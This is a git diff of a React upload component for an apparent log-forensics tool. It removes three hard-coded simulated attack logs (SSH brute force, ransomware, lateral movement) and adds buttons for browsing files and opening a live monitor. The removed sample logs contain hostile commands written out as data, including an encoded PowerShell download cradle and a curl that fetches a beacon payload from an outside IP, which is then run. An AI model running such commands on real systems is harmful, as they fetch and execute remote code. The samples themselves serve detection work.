@@ -1,61 +1,9 @@
 import { useState, useEffect, useRef } from 'react';
+import { useNavigate } from 'react-router-dom';
 import api, { uploadLogs, extractLocalChannel } from '../api';
 import { playCyberClick, playWarpEffect, playThreatAlert } from '../cyberAudio';
 import CyberGlitchText from './CyberGlitchText';
 import CyberReactor from './CyberReactor';
-
-const ATTACK_SIMULATIONS = [
-  {
-    id: 'apt29',
-    title: 'SIM-01: APT29 COZY BEAR',
-    subtitle: 'SSH Brute-force, Sudo Base64 Payload & Outbound C2 Beacon',
-    tag: 'CRITICAL APT',
-    color: 'var(--accent-red)',
-    filename: 'apt29_cozy_bear_breach.log',
-    content: `Oct 28 02:14:01 prod-srv-01 sshd[28410]: Failed password for invalid user admin from 185.220.101.5 port 44211 ssh2
-Oct 28 02:14:05 prod-srv-01 sshd[28412]: Failed password for invalid user root from 185.220.101.5 port 44215 ssh2
-Oct 28 02:14:12 prod-srv-01 sshd[28415]: Failed password for invalid user operator from 185.220.101.5 port 44220 ssh2
-Oct 28 02:14:19 prod-srv-01 sshd[28418]: Failed password for invalid user test from 185.220.101.5 port 44225 ssh2
-Oct 28 02:14:28 prod-srv-01 sshd[28420]: Accepted password for svc-backup from 185.220.101.5 port 44234 ssh2
-Oct 28 02:14:29 prod-srv-01 systemd-logind[1042]: New session 492 of user svc-backup.
-Oct 28 02:15:02 prod-srv-01 sudo[28455]: svc-backup : TTY=pts/2 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/bin/base64 -d /tmp/.payload.b64
-Oct 28 02:15:10 prod-srv-01 sudo[28460]: svc-backup : TTY=pts/2 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/bin/bash /tmp/.run.sh
-Oct 28 02:15:22 prod-srv-01 su[28465]: Successful su for root by svc-backup
-Oct 28 02:15:35 prod-srv-01 kernel: [48912.112] audit: type=1400 audit(1761624935.112:49): apparmor="DENIED" operation="open" profile="/usr/sbin/tcpdump" name="/etc/shadow" pid=28480 comm="tcpdump"
-Oct 28 02:16:01 prod-srv-01 kernel: [48938.001] iptables DROP: IN=eth0 OUT= MAC=00:16:3e:44:aa:bb SRC=185.220.101.5 DST=10.0.0.15 LEN=64 TTL=52 PROTO=TCP SPT=55120 DPT=445
-Oct 28 02:16:44 prod-srv-01 kernel: [48981.442] iptables ACCEPT: IN=eth0 OUT=eth1 SRC=10.0.0.15 DST=185.220.101.5 PROTO=TCP SPT=49882 DPT=8443`
-  },
-  {
-    id: 'ransomware',
-    title: 'SIM-02: RANSOMWARE BLAST',
-    subtitle: 'Encoded PowerShell, Defender Alert, Service Dropper & Log Clearance',
-    tag: 'RANSOMWARE',
-    color: 'var(--accent-magenta)',
-    filename: 'ransomware_killchain_sysmon.log',
-    content: `2026-10-28 03:01:10, EventID: 4625, ComputerName: WIN-SRV-CORE, User: Administrator, IP: 194.26.29.112, Status: 0xC000006D, FailureReason: Bad Password
-2026-10-28 03:01:15, EventID: 4625, ComputerName: WIN-SRV-CORE, User: Administrator, IP: 194.26.29.112, Status: 0xC000006D, FailureReason: Bad Password
-2026-10-28 03:01:25, EventID: 4624, ComputerName: WIN-SRV-CORE, User: Admin_Ops, IP: 194.26.29.112, LogonType: 10
-2026-10-28 03:02:00, EventID: 4672, ComputerName: WIN-SRV-CORE, User: Admin_Ops, Privileges: SeDebugPrivilege, SeTcbPrivilege, SeBackupPrivilege
-2026-10-28 03:02:18, EventID: 4688, ComputerName: WIN-SRV-CORE, Process: powershell.exe, CommandLine: powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=
-2026-10-28 03:02:40, EventID: 1116, ComputerName: WIN-SRV-CORE, Component: Windows Defender, Severity: High, Threat: Ransom:Win32/WannaCry.M!MTB, Path: C:\\Users\\Admin_Ops\\AppData\\Local\\Temp\\locker.exe
-2026-10-28 03:03:05, EventID: 7045, ComputerName: WIN-SRV-CORE, Service: WinLockerDriver, ImagePath: C:\\Windows\\System32\\drivers\\winlocker.sys, StartType: 2
-2026-10-28 03:03:30, EventID: 1102, ComputerName: WIN-SRV-CORE, User: Admin_Ops, Description: The audit log was cleared`
-  },
-  {
-    id: 'lateral',
-    title: 'SIM-03: LATERAL PIVOT',
-    subtitle: 'Cobalt Strike Remote Drop, Curl Payload Staging & Rootkit',
-    tag: 'LATERAL PIVOT',
-    color: 'var(--accent-cyan)',
-    filename: 'cobaltstrike_lateral_pivot.log',
-    content: `Oct 28 04:10:00 gateway kernel: [12901.01] iptables ACCEPT: IN=eth0 OUT=eth1 SRC=10.0.1.45 DST=10.0.2.100 PROTO=TCP SPT=49182 DPT=22
-Oct 28 04:10:02 host-db sshd[19022]: Accepted publickey for deploy from 10.0.1.45 port 49182 ssh2
-Oct 28 04:10:15 host-db su[19045]: Successful su for root by deploy
-Oct 28 04:10:40 host-db auditd[881]: USER_CMD pid=19080 uid=0 auid=1001 ses=4 comm="curl" exe="/usr/bin/curl" cmd="curl -s http://194.135.25.88:8080/beacon.bin -o /dev/shm/.beacon"
-Oct 28 04:11:00 host-db auditd[881]: EXECVE pid=19102 uid=0 auid=1001 ses=4 comm="python" exe="/usr/bin/python" cmd="python /dev/shm/.beacon"
-Oct 28 04:11:30 gateway kernel: [12991.44] iptables DROP: IN=eth1 OUT=eth0 SRC=10.0.2.100 DST=194.135.25.88 PROTO=TCP SPT=49911 DPT=8443`
-  }
-];
 
 export default function Upload({ onAnalysisComplete, loading, setLoading }) {
   const [dragOver, setDragOver] = useState(false);
@@ -64,6 +12,7 @@ export default function Upload({ onAnalysisComplete, loading, setLoading }) {
   const [extracting, setExtracting] = useState(null);
   const [showExtract, setShowExtract] = useState(true);
   const fileInput = useRef(null);
+  const navigate = useNavigate();
 
   useEffect(() => {
     // Fetch available Windows log channels
@@ -87,12 +36,6 @@ export default function Upload({ onAnalysisComplete, loading, setLoading }) {
     } finally {
       setLoading(false);
     }
-  };
-
-  const handleLaunchSimulation = (sim) => {
-    playCyberClick();
-    const file = new File([sim.content], sim.filename, { type: 'text/plain' });
-    handleFile(file);
   };
 
   const handleExtractWindows = async (channelId) => {
@@ -269,7 +212,7 @@ export default function Upload({ onAnalysisComplete, loading, setLoading }) {
         <input ref={fileInput} type="file" accept=".log,.txt,.csv" style={{ display: 'none' }} onChange={(e) => e.target.files[0] && handleFile(e.target.files[0])} />
       </div>
 
-      {/* ── Instant Forensic Simulation Attack Presets ───────────── */}
+      {/* ── Real Telemetry Source Actions ───────────── */}
       <div style={{ marginTop: 18, display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap' }}>
         <div style={{ 
           fontFamily: 'var(--font-mono)', 
@@ -280,46 +223,77 @@ export default function Upload({ onAnalysisComplete, loading, setLoading }) {
           gap: 6,
           letterSpacing: '0.08em'
         }}>
-          <span style={{ color: 'var(--accent-cyan)' }}>⚡</span>
-          <span>QUICK-LAUNCH SIMULATIONS:</span>
+          <span style={{ color: 'var(--accent-cyan)' }}>📡</span>
+          <span>AUTHENTIC FORENSIC CHANNELS:</span>
         </div>
 
-        {ATTACK_SIMULATIONS.map(sim => (
-          <button
-            key={sim.id}
-            onClick={(e) => { e.stopPropagation(); handleLaunchSimulation(sim); }}
-            style={{
-              background: 'rgba(6, 12, 28, 0.85)',
-              border: `1px solid ${sim.color}`,
-              borderRadius: '4px',
-              padding: '6px 14px',
-              color: '#fff',
-              cursor: 'pointer',
-              display: 'flex',
-              alignItems: 'center',
-              gap: 8,
-              fontFamily: 'var(--font-mono)',
-              fontSize: '0.72rem',
-              fontWeight: 600,
-              letterSpacing: '0.06em',
-              boxShadow: `0 0 10px ${sim.color}22`,
-              transition: 'all 0.15s ease'
-            }}
-            onMouseEnter={(e) => {
-              e.currentTarget.style.transform = 'translateY(-2px)';
-              e.currentTarget.style.boxShadow = `0 0 18px ${sim.color}66`;
-              e.currentTarget.style.background = `${sim.color}22`;
-            }}
-            onMouseLeave={(e) => {
-              e.currentTarget.style.transform = 'translateY(0)';
-              e.currentTarget.style.boxShadow = `0 0 10px ${sim.color}22`;
-              e.currentTarget.style.background = 'rgba(6, 12, 28, 0.85)';
-            }}
-          >
-            <span style={{ color: sim.color }}>◈</span>
-            <span>{sim.title}</span>
-          </button>
-        ))}
+        <button
+          onClick={(e) => { e.stopPropagation(); playCyberClick(); fileInput.current?.click(); }}
+          style={{
+            background: 'rgba(6, 12, 28, 0.85)',
+            border: '1px solid var(--accent-cyan)',
+            borderRadius: '4px',
+            padding: '7px 16px',
+            color: '#fff',
+            cursor: 'pointer',
+            display: 'flex',
+            alignItems: 'center',
+            gap: 8,
+            fontFamily: 'var(--font-mono)',
+            fontSize: '0.72rem',
+            fontWeight: 600,
+            letterSpacing: '0.06em',
+            boxShadow: '0 0 10px rgba(0,242,255,0.15)',
+            transition: 'all 0.15s ease'
+          }}
+          onMouseEnter={(e) => {
+            e.currentTarget.style.transform = 'translateY(-2px)';
+            e.currentTarget.style.boxShadow = '0 0 18px rgba(0,242,255,0.4)';
+            e.currentTarget.style.background = 'rgba(0,242,255,0.15)';
+          }}
+          onMouseLeave={(e) => {
+            e.currentTarget.style.transform = 'translateY(0)';
+            e.currentTarget.style.boxShadow = '0 0 10px rgba(0,242,255,0.15)';
+            e.currentTarget.style.background = 'rgba(6, 12, 28, 0.85)';
+          }}
+        >
+          <span style={{ color: 'var(--accent-cyan)' }}>📁</span>
+          <span>BROWSE LOG FILE (.LOG / .TXT / .CSV / .EVTX)</span>
+        </button>
+
+        <button
+          onClick={(e) => { e.stopPropagation(); playCyberClick(); navigate('/app/monitor'); }}
+          style={{
+            background: 'rgba(6, 12, 28, 0.85)',
+            border: '1px solid var(--accent-green)',
+            borderRadius: '4px',
+            padding: '7px 16px',
+            color: '#fff',
+            cursor: 'pointer',
+            display: 'flex',
+            alignItems: 'center',
+            gap: 8,
+            fontFamily: 'var(--font-mono)',
+            fontSize: '0.72rem',
+            fontWeight: 600,
+            letterSpacing: '0.06em',
+            boxShadow: '0 0 10px rgba(5,255,161,0.15)',
+            transition: 'all 0.15s ease'
+          }}
+          onMouseEnter={(e) => {
+            e.currentTarget.style.transform = 'translateY(-2px)';
+            e.currentTarget.style.boxShadow = '0 0 18px rgba(5,255,161,0.4)';
+            e.currentTarget.style.background = 'rgba(5,255,161,0.15)';
+          }}
+          onMouseLeave={(e) => {
+            e.currentTarget.style.transform = 'translateY(0)';
+            e.currentTarget.style.boxShadow = '0 0 10px rgba(5,255,161,0.15)';
+            e.currentTarget.style.background = 'rgba(6, 12, 28, 0.85)';
+          }}
+        >
+          <span style={{ color: 'var(--accent-green)' }}>⚡</span>
+          <span>LAUNCH LIVE OS MONITOR STREAM</span>
+        </button>
       </div>
 
       {error && (
